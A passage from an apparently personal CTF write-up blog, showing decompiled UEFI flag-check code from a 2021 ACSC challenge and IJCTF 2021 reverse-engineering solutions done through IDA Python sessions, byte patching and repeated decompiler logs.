class="string">L&quot;PciRoot(0x0)/Pci(0x1,0x1)/Ata(0x0)&quot;</span>);</span><br><span class="line">    Status = (BS-&gt;LocateDevicePath)(a1, a2, &amp;v23, &amp;unk_9620, &amp;v22);</span><br><span class="line">    <span class="keyword">if</span> ( Status &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Status = (BS-&gt;HandleProtocol)(a1, a2, &amp;unk_9620, v22, &amp;v21);</span><br><span class="line">      <span class="keyword">if</span> ( Status &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Status = (*(v21 + <span class="number">0x18</span>))(a1, a2, **(v21 + <span class="number">8</span>), v21, <span class="number">1LL</span>, <span class="number">512LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( Status &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v19[<span class="number">0</span>] == <span class="string">&#x27;TRAP IFE&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = <span class="built_in">sub_7D9</span>();</span><br><span class="line">            v27 = <span class="built_in">sub_1F8D</span>(a1, a2, v8, v7);</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">sub_C24</span>(a1, a2, qword_6620, v27, <span class="number">128LL</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( <span class="built_in">sub_4D87</span>(a1, a2, &amp;v20, v27, <span class="number">0x10uLL</span>, qword_6630, v13, v14, v15, v16, v18) )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">sub_1060</span>();</span><br><span class="line">                Status = <span class="built_in">sub_11DD</span>(a1, a2, <span class="number">0x20uLL</span>, &amp;v26[<span class="number">5</span>], v17, <span class="number">0x10uLL</span>);</span><br><span class="line">                <span class="keyword">if</span> ( Status &gt;= <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( <span class="built_in">sub_1D10</span>(a1, a2, v17, v18, <span class="number">0x10LL</span>) )</span><br><span class="line">                    <span class="built_in">printf</span>(a1, a2, v11, <span class="string">L&quot;Wrong!\n&quot;</span>);</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(a1, a2, v11, <span class="string">L&quot;Correct!\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">printf</span>(a1, a2, Status, <span class="string">L&quot;ERROR: StrHexToBytes() failed: %r\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">printf</span>(a1, a2, v10, <span class="string">L&quot;ERROR: AesCbcEncrypt() failed.\n&quot;</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(a1, a2, v9, <span class="string">L&quot;ERROR: AesInit() failed.\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(a1, a2, <span class="string">&#x27;TRAP IFE&#x27;</span>, <span class="string">L&quot;ERROR: Header signature mismatch.\n&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(a1, a2, Status, <span class="string">L&quot;ERROR: BlockIo-&gt;ReadBlocks() failed: %r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(a1, a2, Status, <span class="string">L&quot;ERROR: gBS-&gt;HandleProtocol() failed: %r\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(a1, a2, Status, <span class="string">L&quot;ERROR: gBS-&gt;LocateDevicePath() failed: %r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(qword_9BB8 + <span class="number">0x68</span>))(a1, a2, <span class="number">0LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>qemu调试将该PE加载到固定地址0x6668000</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/09/23/2021acscctf/" data-id="cuidsXYsO23BGezgopUOSWW2s" data-title="2021 ACSC CTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2021ijctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/08/16/2021ijctf/" class="article-date">
  <time class="dt-published" datetime="2021-08-16T03:07:10.000Z" itemprop="datePublished">2021-08-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/08/16/2021ijctf/">IJCTF 2021</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="sanity-rev"><a href="#sanity-rev" class="headerlink" title="sanity-rev"></a>sanity-rev</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;get_bytes(<span class="number">0x2030</span>,<span class="number">0x26</span>)</span><br><span class="line"><span class="string">b&#x27;IJCTF&#123;simple_sanity_check_for_babies&#125;\x00&#x27;</span></span><br><span class="line">Python&gt;a = <span class="built_in">list</span>(get_bytes(<span class="number">0x2030</span>,<span class="number">0x26</span>))</span><br><span class="line">Python&gt;a</span><br><span class="line">[<span class="number">0x49</span>, <span class="number">0x4a</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7b</span>, <span class="number">0x73</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x6c</span>, <span class="number">0x65</span>, <span class="number">0x5f</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x6e</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x5f</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x6b</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x5f</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x7d</span>, <span class="number">0x0</span>]</span><br><span class="line">Python&gt;b = <span class="built_in">list</span>(get_bytes(<span class="number">0x2008</span>,<span class="number">0x26</span>))</span><br><span class="line">Python&gt;b</span><br><span class="line">[<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x18</span>, <span class="number">0x2f</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x3b</span>, <span class="number">0x2c</span>, <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x1d</span>, <span class="number">0x2b</span>, <span class="number">0x1f</span>, <span class="number">0x3e</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x3a</span>, <span class="number">0x5</span>, <span class="number">0x4</span>, <span class="number">0x2d</span>, <span class="number">0x39</span>, <span class="number">0x6</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x10</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0x11</span>, <span class="number">0x4c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>]</span><br><span class="line">Python&gt;a^b</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unsupported operand <span class="built_in">type</span>(s) <span class="keyword">for</span> ^: <span class="string">&#x27;list&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;list&#x27;</span></span><br><span class="line">Python&gt;<span class="keyword">from</span> numpy <span class="keyword">import</span> np</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: cannot <span class="keyword">import</span> name <span class="string">&#x27;np&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;numpy&#x27;</span> (C:\Users\ostrich\WPy64-<span class="number">3771</span>\python-<span class="number">3.7</span><span class="number">.7</span>.amd64\lib\site-packages\numpy\__init__.py)</span><br><span class="line">Python&gt;<span class="keyword">import</span> numpy</span><br><span class="line">Python&gt; np.bitwise_xor(a,b)</span><br><span class="line">Python&gt;c = np.bitwise_xor(a,b)</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    np.bitwise_xor(a,b)</span><br><span class="line">    ^</span><br><span class="line">IndentationError: unexpected indent</span><br><span class="line">Python&gt;c = numpy.bitwise_xor(a,b)</span><br><span class="line">Python&gt;c</span><br><span class="line">[ <span class="number">73</span>  <span class="number">74</span>  <span class="number">67</span>  <span class="number">84</span>  <span class="number">70</span> <span class="number">123</span> <span class="number">121</span> <span class="number">111</span> <span class="number">117</span>  <span class="number">95</span> <span class="number">100</span> <span class="number">105</span> <span class="number">100</span>  <span class="number">95</span> <span class="number">110</span> <span class="number">111</span> <span class="number">116</span>  <span class="number">95</span></span><br><span class="line"> <span class="number">102</span>  <span class="number">97</span> <span class="number">108</span> <span class="number">108</span>  <span class="number">95</span> <span class="number">102</span> <span class="number">111</span> <span class="number">114</span>  <span class="number">95</span> <span class="number">105</span> <span class="number">116</span>  <span class="number">95</span> <span class="number">114</span> <span class="number">105</span> <span class="number">103</span> <span class="number">104</span> <span class="number">116</span>  <span class="number">63</span></span><br><span class="line"> <span class="number">125</span>   <span class="number">0</span>]</span><br><span class="line">Python&gt;d = <span class="built_in">map</span>(<span class="built_in">chr</span>,c)</span><br><span class="line">Python&gt;<span class="built_in">print</span>(d)</span><br><span class="line">&lt;<span class="built_in">map</span> <span class="built_in">object</span> at <span class="number">0x0000026EAC07CE08</span>&gt;</span><br><span class="line">Python&gt;<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(d))</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(d))</span><br><span class="line">                         ^</span><br><span class="line">SyntaxError: unexpected EOF <span class="keyword">while</span> parsing</span><br><span class="line">Python&gt;<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(d))</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(d))</span><br><span class="line">                         ^</span><br><span class="line">SyntaxError: unexpected EOF <span class="keyword">while</span> parsing</span><br><span class="line">Python&gt;</span><br><span class="line">Python&gt;<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(d)))</span><br><span class="line">IJCTF&#123;you_did_not_fall_for_it_right?&#125;	</span><br></pre></td></tr></table></figure>

<p>IJCTF{you_did_not_fall_for_it_right?}</p>
<h2 id="helloworld-rev"><a href="#helloworld-rev" class="headerlink" title="helloworld-rev"></a>helloworld-rev</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;UH\x89\xe5SH\x81\xec\xe8\x00\x00\x00H\x8d\x85@\xff\xff\xff\xba\x02\x00\x00\x00H\xbe\xc3q\\\x00\x00\x00\x00\x00H\x89\xc7H\xb8\x1c&#125;@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x95@\xff\xff\xffH\x8d\x850\xff\xff\xffH\x89\xd6H\x89\xc7H\xb8\x96x@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x850\xff\xff\xffH\x89E\xe8H\x8d\x85@\xff\xff\xffH\x89\xc7H\xb8&amp;s@\x00\x00\x00\x00\x00\xff\xd0H\x8bU\xe8H\x8d\x85p\xff\xff\xffH\x89\xd6H\x89\xc7H\xb8^z@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85 \xff\xff\xffH\x8d\x95p\xff\xff\xffH\x89\xd6H\x89\xc7H\xb8\x87y@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85p\xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8bU\xe8H\x8dE\x80H\x89\xd6H\x89\xc7H\xb8^z@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85\x10\xff\xff\xffH\x8dU\x80H\x89\xd6H\x89\xc7H\xb8\xday@\x00\x00\x00\x00\x00\xff\xd0H\x8dE\x80H\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x95\x10\xff\xff\xffH\x8d\x85 \xff\xff\xffH\x89\xd6H\x89\xc7H\xb8*y@\x00\x00\x00\x00\x00\xff\xd0\x84\xc0\x0f\x84&#123;\x01\x00\x00H\x8d\x85 \xff\xff\xffH\x89\xc7H\xb8\xd0\x87H\x00\x00\x00\x00\x00\xff\xd0H\x89E\xe0H\x8bE\xe0H\x89\xc7H\xb8@x@\x00\x00\x00\x00\x00\xff\xd0H\x89\xc2H\x8dE\xb0H\x89\xd6H\x89\xc7H\xb8\xc8u@\x00\x00\x00\x00\x00\xff\xd0H\x8dE\x90H\x8dU\xb0H\x89\xd6H\x89\xc7H\xb8&gt;u@\x00\x00\x00\x00\x00\xff\xd0H\x8dE\x90H\xbe\xa8q\\\x00\x00\x00\x00\x00H\x89\xc7H\xb8\x95~@\x00\x00\x00\x00\x00\xff\xd0\x89\xc3H\x8dE\x90H\x89\xc7H\xb80\xeeF\x00\x00\x00\x00\x00\xff\xd0H\x8dE\xb0H\x89\xc7H\xb8&amp;s@\x00\x00\x00\x00\x00\xff\xd0\x84\xdb\x0f\x84\xb3\x00\x00\x00H\x8bE\xe0H\x89\xc7H\xb8@x@\x00\x00\x00\x00\x00\xff\xd0H\x89\xc7H\xb8\x9as@\x00\x00\x00\x00\x00\xff\xd0H\xba@\x9d\\\x00\x00\x00\x00\x00H\x89\x02H\xb8@\x9d\\\x00\x00\x00\x00\x00H\x8b\x00H\xbe\xbcq\\\x00\x00\x00\x00\x00H\x89\xc7H\xb8\xd0\xf5M\x00\x00\x00\x00\x00\xff\xd0H\xba\x08\x9d\\\x00\x00\x00\x00\x00H\x89\x02H\xb8\x08\x9d\\\x00\x00\x00\x00\x00H\x8b\x00H\xba@q\\\x00\x00\x00\x00\x00H\xbe\xb8q\\\x00\x00\x00\x00\x00H\x89\xc7\xb8\x00\x00\x00\x00H\xb9\xb0\nM\x00\x00\x00\x00\x00\xff\xd1H\xb8\x08\x9d\\\x00\x00\x00\x00\x00H\x8b\x00H\x89\xc7H\xb8\x80\xeeM\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85 \xff\xff\xffH\x89\xc7H\xb8@\x88H\x00\x00\x00\x00\x00\xff\xd0\xe9]\xfe\xff\xffH\x8d\x85\x10\xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85 \xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x850\xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0\xe9\x9a\x00\x00\x00H\x89\xc3H\x8d\x85@\xff\xff\xffH\x89\xc7H\xb8&amp;s@\x00\x00\x00\x00\x00\xff\xd0H\x89\xd8H\x89\xc7H\xb8\xa0\x00K\x00\x00\x00\x00\x00\xff\xd0H\x89\xc3H\x8dE\xb0H\x89\xc7H\xb8&amp;s@\x00\x00\x00\x00\x00\xff\xd0\xeb\x03H\x89\xc3H\x8d\x85\x10\xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85 \xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x850\xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x89\xd8H\x89\xc7H\xb8\xa0\x00K\x00\x00\x00\x00\x00\xff\xd0H\x8b]\xf8\xc9\xc3\x13&#x27;</span><br><span class="line">Python&gt;a = bytes(a)</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5C7206,a)</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">401000: using guessed type __int64 init_proc(void);</span><br><span class="line">406230: using guessed type __int64 __fastcall GLOBAL__sub_I_cxx11_locale_inst_cc(_QWORD, _QWORD, _QWORD);</span><br><span class="line">5BD728: using guessed type __int64 (__fastcall *_frame_dummy_init_array_entry[2])();</span><br><span class="line">5BD790: using guessed type __int64 (__fastcall *_do_global_dtors_aux_fini_array_entry[2])();</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Command &quot;MakeArray&quot; failed</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char 